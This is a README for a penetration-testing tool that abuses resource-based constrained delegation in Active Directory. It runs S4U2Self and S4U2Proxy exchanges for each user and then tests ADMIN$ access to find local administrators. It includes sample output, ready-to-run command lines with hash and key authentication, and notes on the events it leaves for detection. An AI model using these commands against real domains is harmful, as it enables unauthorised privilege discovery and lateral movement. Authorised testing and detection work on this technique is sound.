# rbcdbrute

Once you control an account with RBCD rights over a machine, you can impersonate
anyone on it. `rbcdbrute` turns that into a question worth asking: **which domain
users are local administrators of that machine?**

It runs an S4U2Self + S4U2Proxy exchange per user, then tries to connect to the
`ADMIN$` share with the resulting service ticket. `ADMIN$` is only reachable by
local administrators, so a successful tree connect is the answer. Everything is
pure impacket — no `smbclient`, no external binary, no ticket written to disk.

```
[*] Authentication
    account   ATTACKER$@RED.LOCAL
    method    NT hash -> AS-REQ
    KDC       10.10.100.10
    TGT       OK

[*] Target
    host      WK01.red.local (10.10.100.11:445)
    SPN       cifs/WK01.red.local
    check     S4U2Self + S4U2Proxy, then ADMIN$ tree connect
    SPN check OK

[*] Run
    users     1007
    threads   20
    timeout   10s  (SMB)
    output    stdout only (-o FILE to save)

[+] ADMIN    Administrator
[+] ADMIN    nnino

-------------------------- Summary --------------------------
       2  admins    local administrators of the target
      72  no ticket not delegatable, disabled, locked out or expired
       3  unknown   no such principal in the realm
       0  errors    unexpected failures
    1007  checked   out of 1007 in 12.8s

  no ticket breakdown:
       40x  KDC_ERR_BADOPTION
       32x  KDC_ERR_CLIENT_REVOKED

  Local admins (-o FILE to save them)
    + Administrator
    + nnino
```

<!-- POC: screenshot / asciinema of a full run -->

## Prerequisites

RBCD must **already be configured** — this tool exploits it, it does not set it
up. You need an account whose SID is in the target's
`msDS-AllowedToActOnBehalfOfOtherIdentity`

You also need network access to the KDC (88/tcp) and to the target (445/tcp).

## Installation

```bash
git clone https://github.com/nnnnino/rbcdbrute.git
cd rbcdbrute
python3 -m venv venv && source venv/bin/activate
pip install impacket tqdm
```

Tested with impacket 0.13.1 and 0.14.0.dev0, Python 3.11+.

## Usage

```
rbcdbrute.py [options] domain.local/username[:password]
```

The positional argument is **your** account, the one RBCD is delegated *from*.
`-target` is the machine you want to enumerate admins on.

```bash
# NT hash
python3 rbcdbrute.py 'red.local/ATTACKER$' -hashes ':C7A9F9542CC3B79D7FBD56E016F2EEEA' \
  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10

# password (prompted if omitted)
python3 rbcdbrute.py 'red.local/ATTACKER$':'ATTACKER' \
  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10

# existing ccache
export KRB5CCNAME=attacker.ccache
python3 rbcdbrute.py 'red.local/ATTACKER$' -k -no-pass \
  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10

# AES key
python3 rbcdbrute.py 'red.local/ATTACKER$' -aesKey <hex> \
  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
```

`-target` takes the **machine account name** (`WK01$`), not an FQDN. The FQDN is
rebuilt from the realm to form the SPN, and resolved via DNS unless `-target-ip`
is given.

## Detection footprint

This is loud. Each user produces a `4769` (Kerberos service ticket requested) on
the DC, with the transited-services field populated the signature of S4U. A
thousand users in thirty seconds is not subtle, and the `ADMIN$` connections
land as `5140` on the target. Run it knowing that.

## Notes

- Only the local Administrators membership is probed; nothing is written to the target and no command is executed on it.
- Tickets stay in memory. Use `getST.py` if you want one on disk.
- `-threads` above ~30 tends to produce timeouts rather than speed.

> Use only against systems you are authorised to test.
